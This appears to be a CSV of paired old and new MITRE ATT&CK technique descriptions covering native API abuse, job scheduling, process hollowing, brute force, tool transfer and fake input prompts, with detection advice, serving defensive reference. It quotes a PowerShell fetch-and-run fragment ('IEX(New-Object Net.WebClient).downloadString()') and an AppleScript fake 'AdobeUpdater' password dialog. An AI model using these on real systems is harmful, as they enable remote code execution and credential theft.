A056,T1106,9.0,10.0,Native API,Native API,"Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries may abuse these native API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.","Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. (Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001))."
A057,T1168,2.0,3.0,Local Job Scheduling,Local Job Scheduling,"On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

===cron===

System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on Mac and Linux systems.

Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

===at===

The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

===launchd===

Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

Detection: Legitimate scheduled jobs may be created during installation of new software or through administration functions. Jobs scheduled with launchd and cron can be monitored from their respective utilities to list out detailed information about the jobs. Monitor process execution resulting from launchd and cron tasks to look for unusual or unknown applications and behavior.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring

Permissions Required: Administrator, User, root

Contributors: Anastasios Pingios","On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

### cron

System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

### at

The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

### launchd

Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X."
A058,T1053,2.0,3.0,Scheduled Task,Scheduled Task,"Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

Detection: Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

*Event ID 106 - Scheduled task registered
*Event ID 140 - Scheduled task updated
*Event ID 141 - Scheduled task removed

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

Platforms: Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring, Windows event logs

Effective Permissions: Administrator, SYSTEM, User

Permissions Required: Administrator, SYSTEM, User

Remote Support: Yes

Contributors: Travis Smith, Tripwire, Leo Loobeek, @leoloobeek, Alain Homewood, Insomnia Security","Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account."
A059,T1010,2.0,3.0,Application Window Discovery,Application Window Discovery,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.

In Mac, this can be done natively with a small AppleScript script.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: macOS, Windows

Data Sources: API monitoring, Process command-line parameters, Process monitoring

Permissions Required: User","Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.

In Mac, this can be done natively with a small [AppleScript](https://attack.mitre.org/techniques/T1155) script."
A060,T1110,17.0,18.0,Brute Force,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.","Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access. 

If an adversary guesses the correct password but fails to login to a compromised account due to location-based conditional access policies, they may change their infrastructure until they match the victim’s location and therefore bypass those policies.(Citation: ReliaQuest Health Care Social Engineering Campaign 2024)"
A061,T1173,2.0,3.0,Dynamic Data Exchange,Dynamic Data Exchange,"Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

Detection: OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution. (Citation: NVisio Labs DDE Detection Oct 2017)

Monitor for Microsoft Office applications loading DLLs and other modules not typically associated with the application.

Monitor for spawning of unusual processes (such as cmd.exe) from Microsoft Office applications.

Platforms: Windows

Data Sources: API monitoring, DLL monitoring, Process Monitoring, Windows Registry, Windows event logs

Permissions Required: User

Remote Support: No","Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution."
A062,T1093,2.0,3.0,Process Hollowing,Process Hollowing,"Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to Process Injection, execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Engame Process Injection July 2017)

Detection: Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls that unmap process memory, such as ZwUnmapViewOfSection or NtUnmapViewOfSection, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Engame Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

Platforms: Windows

Data Sources: Process monitoring, API monitoring

Defense Bypassed: Process whitelisting, Anti-virus, Whitelisting by file name or path, Signature-based detection

Permissions Required: User","Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process Injection July 2017)"
A063,T1136.003,14.0,15.0,Cloud Account,Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.

Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).","Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)

Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.

Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)."
A064,T1018,7.0,8.0,Remote System Discovery,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. 

Specific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.

Within IaaS (Infrastructure as a Service) environments, remote systems include instances and virtual machines in various states, including the running or stopped state. Cloud providers have created methods to serve information about remote systems, such as APIs and CLIs. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API and a <code>describe-instances</code> command within the AWS CLI that can return information about all instances within an account.(Citation: Amazon Describe Instances API)(Citation: Amazon Describe Instances CLI) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project, and Azure's CLI <code>az vm list</code> lists details of virtual machines.(Citation: Google Compute Instances)(Citation: Azure VM List)","Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. 

Specific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain."
A065,T1105,12.0,13.0,Ingress Tool Transfer,Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)","Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)"
A066,T1016,11.0,12.0,System Network Configuration Discovery,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes.(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ","Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. "
A067,T1014,2.0,3.0,Rootkit,Rootkit,"Rootkits are programs that hide the existence of malware by intercepting (i.e., Hooking) and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a Hypervisor, Master Boot Record, or the System Firmware. (Citation: Wikipedia Rootkit)

Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)

Detection: Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)

Platforms: Linux, macOS, Windows

Data Sources: BIOS, MBR, System calls

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems, Process whitelisting, Signature-based detection, System access controls, Whitelisting by file name or path

Permissions Required: Administrator, SYSTEM, root","Rootkits are programs that hide the existence of malware by intercepting (i.e., [Hooking](https://attack.mitre.org/techniques/T1179)) and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a [Hypervisor](https://attack.mitre.org/techniques/T1062), Master Boot Record, or the [System Firmware](https://attack.mitre.org/techniques/T1019). (Citation: Wikipedia Rootkit)

Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)"
A068,T1593,8.0,9.0,Search Open Websites/Domains,Search Open Websites/Domains,"Before compromising a victim, adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).","Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566))."
A069,T1030,2.0,3.0,Data Transfer Size Limits,Data Transfer Size Limits,"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes",An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.
A070,T1141,2.0,3.0,Input Prompt,Input Prompt,"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:

<code>set thePassword to the text returned of (display dialog ""AdobeUpdater needs permission to check for updates. Please authenticate."" default answer """")</code>
 (Citation: OSX Keydnap malware)

Adversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)

Detection: This technique exploits users' tendencies to always supply credentials when prompted, which makes it very difficult to detect. Monitor process execution for unusual programs as well as AppleScript that could be used to prompt users for credentials.

Platforms: macOS

Data Sources: User interface, Process Monitoring

Permissions Required: User","When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:

<code>set thePassword to the text returned of (display dialog ""AdobeUpdater needs permission to check for updates. Please authenticate."" default answer """")</code>
 (Citation: OSX Keydnap malware)

Adversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)"
A071,T1072,14.0,15.0,Software Deployment Tools,Software Deployment Tools,"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  

Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. (Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.","Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  

Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)

Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)

